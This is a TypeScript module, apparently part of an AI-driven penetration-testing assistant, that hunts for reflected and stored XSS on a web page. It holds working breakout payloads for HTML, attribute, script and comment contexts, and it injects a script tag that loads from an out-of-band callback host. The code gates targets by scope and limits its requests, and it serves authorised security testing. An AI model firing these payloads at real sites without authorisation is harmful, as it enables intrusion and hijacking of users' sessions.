// xssHunt.ts — reflected/stored XSS orchestrator (xss_hunt).
//
// For each injection point (query params + form fields from the page):
//  1. reflection probe with an inert alphanumeric marker → classify context
//     (html-text / attribute / script / comment / none);
//  2. on reflection: ONE context-appropriate breakout attempt (bounded);
//  3. script-src OAST payload for stored/blind candidates → oast_poll.
// Correlation (reflection + breakout/OAST) → finding-grade signal.
// Reflection alone is reported honestly (context + suggested breakout), never
// as confirmed XSS. Sinyal ≠ exploit: `poc_verify` → `finding_add`.
// Scope-gated, bounded (≤8 points × ≤3 payloads), session-safe.
// Write — confirm.

import { targetAllowed, politeDelay } from "./security";
import { sessionHeaders } from "./httpSession";
import { parseForms } from "./csrfProve";

export type XssContext = "html" | "attribute" | "script" | "comment" | "none";

function randMarker(): string {
  return `mx${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`.replace(/[^a-z0-9]/g, "").slice(0, 14);
}

/**
 * Classify where a marker lands in a response body. Pure.
 * Order matters: comment > script > attribute > html.
 */
export function xssContext(body: string, marker: string): XssContext {
  const b = body || "";
  if (!marker || !b.includes(marker)) return "none";
  const i = b.indexOf(marker);
  const before = b.slice(Math.max(0, i - 600), i);
  const after = b.slice(i + marker.length, i + marker.length + 60);
  if (/<!--(?!.*-->)/s.test(before.slice(-600))) {
    const open = before.lastIndexOf("<!--");
    const close = before.lastIndexOf("-->");
    if (open > close) return "comment";
  }
  const scriptOpen = before.toLowerCase().lastIndexOf("<script");
  const scriptClose = before.toLowerCase().lastIndexOf("</script>");
  if (scriptOpen > scriptClose) return "script";
  // Inside a tag: ...<tag attr="MARKER... or attr=MARKER...
  const tagOpen = before.lastIndexOf("<");
  const tagClose = before.lastIndexOf(">");
  if (tagOpen > tagClose) {
    const tagFrag = before.slice(tagOpen);
    if (/=\s*["']?$/.test(tagFrag) || /=\s*["'][^"']*$/.test(tagFrag)) return "attribute";
    return "html";
  }
  void after;
  return "html";
}

/** One breakout confirmer per context (bounded, lab-scoped). Pure data. */
export function breakoutFor(context: XssContext, marker: string): string | null {
  switch (context) {
    case "html": return `<b>${marker}</b>`;
    case "attribute": return `" autofocus onfocus="alert(document.domain)`;
    case "script": return `";alert(document.domain);//`;
    case "comment": return `--><svg onload=alert(document.domain)>`;
    default: return null;
  }
}

export type FetchFn = (url: string, init?: { method?: string; headers?: Record<string, string>; body?: string }) => Promise<{ status: number; body: string }>;

async function defaultFetch(url: string, init: { method?: string; headers?: Record<string, string>; body?: string } = {}): Promise<{ status: number; body: string }> {
  try {
    const res = await fetch(url, {
      method: init.method || "GET",
      headers: { "User-Agent": "mia-assistant/1.0", ...(init.headers || {}) },
      body: init.method && init.method !== "GET" && init.method !== "HEAD" ? init.body : undefined,
      redirect: "manual",
      signal: AbortSignal.timeout(12_000),
    });
    return { status: res.status, body: (await res.text()).slice(0, 12_000) };
  } catch {
    return { status: 0, body: "" };
  }
}

type InjPoint = { kind: "param" | "form"; name: string; url: string; method: string; bodyBase: string; contentType: string };

function pointsFromPage(pageUrl: string, body: string): InjPoint[] {
  const pts: InjPoint[] = [];
  try {
    const u = new URL(pageUrl);
    for (const k of u.searchParams.keys()) {
      pts.push({ kind: "param", name: k, url: pageUrl, method: "GET", bodyBase: "", contentType: "" });
    }
  } catch { /* ignore */ }
  for (const f of parseForms(body, pageUrl)) {
    const target = f.action || pageUrl;
    try {
      if (new URL(target).origin !== new URL(pageUrl).origin) continue;
    } catch { continue; }
    for (const inp of f.inputs) {
      if (!inp.name || /^(csrf|token|nonce)/i.test(inp.name)) continue;
      const ct = f.method === "GET" ? "" : "application/x-www-form-urlencoded";
      pts.push({ kind: "form", name: inp.name, url: target, method: f.method, bodyBase: "", contentType: ct });
    }
    if (!f.inputs.length) pts.push({ kind: "form", name: "(no-name)", url: target, method: f.method, bodyBase: "", contentType: "" });
  }
  return pts.slice(0, 8);
}

async function fire(
  fetchFn: FetchFn, p: InjPoint, value: string, headers: Record<string, string>
): Promise<{ status: number; body: string }> {
  if (p.kind === "param") {
    const u = new URL(p.url);
    u.searchParams.set(p.name, value);
    return fetchFn(u.toString(), { headers });
  }
  const params = new URLSearchParams();
  params.set(p.name === "(no-name)" ? "q" : p.name, value);
  return fetchFn(p.url, { method: p.method, headers: { ...headers, ...(p.contentType ? { "Content-Type": p.contentType } : {}) }, body: params.toString() });
}

/**
 * Hunt XSS on a page. Scope-gated, bounded.
 * `callback`: OAST https URL for stored/blind script-src proof (auto-created
 * when possible, else skipped honestly).
 */
export async function xssHunt(
  rawUser: unknown,
  opts: { url?: string; session?: string; callback?: string; fetchFn?: FetchFn; pollOast?: () => Promise<string> } = {}
): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw)) return "Error: SCOPE — xss_hunt hanya untuk lab / engagement aktif.";
  const fetchFn = opts.fetchFn || defaultFetch;
  const sess = opts.session ? sessionHeaders(rawUser, opts.session) : null;
  if (opts.session && !sess) return `Error: session "${opts.session}" tidak dikenal (buat via http_session / auth_setup / har_import).`;
  const headers: Record<string, string> = { ...(sess?.headers || {}) };
  if (sess?.cookie) headers["cookie"] = sess.cookie;

  let callback = String(opts.callback || "").trim();
  if (!callback) {
    try {
      const { oastCreate } = await import("./oast");
      const created = await oastCreate(rawUser);
      const m = /https:\/\/webhook\.site\/[0-9a-f-]+/i.exec(created);
      if (m) callback = m[0];
    } catch { /* OAST optional — blind proof degraded honestly */ }
  }
  if (callback && !/^https:\/\//i.test(callback)) return "Error: callback harus https (URL OAST milikmu).";

  let page: { status: number; body: string };
  try {
    await politeDelay();
    page = await fetchFn(raw, { headers });
  } catch (e) {
    return `Error: fetch gagal: ${e instanceof Error ? e.message : String(e)}`;
  }
  if (page.status === 0) return "Error: target tidak terjangkau.";
  const points = pointsFromPage(raw, page.body);
  const lines: string[] = [`🎯 XSS HUNT ${raw} — ${points.length} titik injeksi${callback ? " + OAST blind" : " (tanpa OAST: blind/stored tak terbukti)"}.`];
  if (!points.length) {
    lines.push("Tidak ada titik injeksi (tanpa param/form) — tidak ada yang diuji.");
    return lines.join("\n");
  }
  let signals = 0;
  for (const p of points) {
    const label = p.kind === "param" ? `?${p.name}=` : `${p.method} ${p.url} [${p.name}]`;
    const marker = randMarker();
    let r1: { status: number; body: string };
    try {
      await politeDelay();
      r1 = await fire(fetchFn, p, marker, headers);
    } catch {
      lines.push(`• ${label} — request gagal — ERROR.`);
      continue;
    }
    const ctx = xssContext(r1.body, marker);
    if (ctx === "none") {
      lines.push(`• ${label} — marker tidak ter-reflect — bersih untuk payload ini.`);
      continue;
    }
    // Reflected: try ONE context breakout + optional script-src beacon.
    const bo = breakoutFor(ctx, marker);
    let broke = false;
    if (bo) {
      try {
        await politeDelay();
        const r2 = await fire(fetchFn, p, bo, headers);
        broke = r2.body.includes(marker) && r2.status > 0;
      } catch { /* breakout attempt failed — stay honest */ }
    }
    let oastHit = "";
    if (callback) {
      try {
        await politeDelay();
        await fire(fetchFn, p, `<script src="${callback}/x"></script>`, headers);
        if (opts.pollOast) {
          const poll = await opts.pollOast();
          if (/request diterima|1 request|[1-9]\d* request/i.test(poll)) oastHit = " + BEACON OAST TERKONFIRMASI";
        } else {
          try {
            const { oastPoll } = await import("./oast");
            const poll = await oastPoll(rawUser);
            if (/request diterima|1 request|[1-9]\d* request/i.test(poll)) oastHit = " + BEACON OAST TERKONFIRMASI";
          } catch { /* poll best-effort */ }
        }
      } catch { /* beacon best-effort */ }
    }
    if (broke || oastHit) {
      signals++;
      lines.push(`• ${label} — 🚨 REFLECT (${ctx})${broke ? " + BREAKOUT lolos" : ""}${oastHit} — kandidat XSS kuat.`);
    } else {
      lines.push(`• ${label} — ter-reflect (konteks ${ctx}) tapi breakout/OAST tak terkonfirmasi — kandidat lemah, verifikasi manual.`);
    }
  }
  lines.push("");
  lines.push(signals ? `⚠️ ${signals} kandidat XSS kuat — replay deterministik + \`poc_verify\` → \`finding_add\`.` : "Tidak ada kandidat XSS kuat (refleksi tanpa breakout bukan bukti exploit).");
  return lines.join("\n");
}
